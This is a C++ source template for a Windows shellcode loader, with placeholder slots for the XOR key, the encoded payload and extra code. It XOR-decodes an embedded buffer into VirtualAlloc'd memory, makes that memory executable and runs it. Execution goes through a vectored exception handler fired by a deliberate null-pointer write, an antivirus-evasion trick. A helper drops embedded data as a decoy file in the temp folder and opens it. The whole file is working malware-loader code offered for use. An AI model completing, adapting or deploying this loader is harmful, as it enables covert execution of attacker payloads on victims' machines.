#include <windows.h>
#include <shlwapi.h>
@@@slot@@@
#define XOR_KEY @@@slot_0@@@

int g_flag = 0;
unsigned char buf[@@@slot_1@@@] = @@@slot_2@@@;
@@@slot_3@@@

PVOID veh_op(PVOID p_veh) {
    return AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)p_veh);
}

void encode(LPVOID buf, int size, const char* key, int key_len) {
    unsigned char* p = (unsigned char*)buf;
    for (int i = 0; i < size; ++i) {
        p[i] ^= key[i % key_len];
    }
}

void decode(LPVOID buf, int size, const char* key, int key_len) {
    encode(buf, size, key, key_len);
}

DWORD rw(PVOID base, SIZE_T size=1) {
    DWORD old_prot;
    VirtualProtect(base, size, PAGE_READWRITE, &old_prot);
    return old_prot;
}

DWORD rx(PVOID base, SIZE_T size=1) {
    DWORD old_prot;
    VirtualProtect(base, size, PAGE_EXECUTE, &old_prot);
    return old_prot;
}

DWORD rwx(PVOID base, SIZE_T size=1) {
    DWORD old_prot;
    VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &old_prot);
    return old_prot;
}

PVOID alloc(SIZE_T size) {
    return VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
}

void exec(PVOID base) {
    ((void (*)())base)();
}

void write_temp_file_and_exec(unsigned char *file_data, int file_data_len, LPCWSTR ext_name) {
	WCHAR szTempFileName[MAX_PATH];
    WCHAR lpTempPathBuffer[MAX_PATH];
	WCHAR szModuleFileName[MAX_PATH];
	DWORD number_of_bytes_written;
	HANDLE h_file;
	
	GetTempPathW(MAX_PATH, lpTempPathBuffer);
	GetModuleFileNameW(NULL, szModuleFileName, MAX_PATH);
	PathStripPathW(szModuleFileName);
	PathRemoveExtensionW(szModuleFileName);
	lstrcpyW(szTempFileName, lpTempPathBuffer);
	lstrcatW(szTempFileName, szModuleFileName);
	lstrcatW(szTempFileName, ext_name);
	
	h_file = CreateFileW((LPWSTR)szTempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(h_file, file_data, file_data_len, &number_of_bytes_written, NULL);
	ShellExecuteW(NULL, NULL, szTempFileName, NULL, NULL, SW_SHOWNORMAL);
	CloseHandle(h_file);
}

void handler() {
	if(!g_flag) {
		PVOID p_shellcode = alloc(sizeof(buf));
		memcpy(p_shellcode, buf, sizeof(buf));
		decode(p_shellcode, sizeof(buf), XOR_KEY, 4);
		rx(p_shellcode, sizeof(buf));
		@@@slot_4@@@;
		g_flag = 1;
		exec(p_shellcode);
	}
}

int main() {
    veh_op((PVOID)handler);
    int *p = nullptr;
    *p = 888;
    return 0;
} 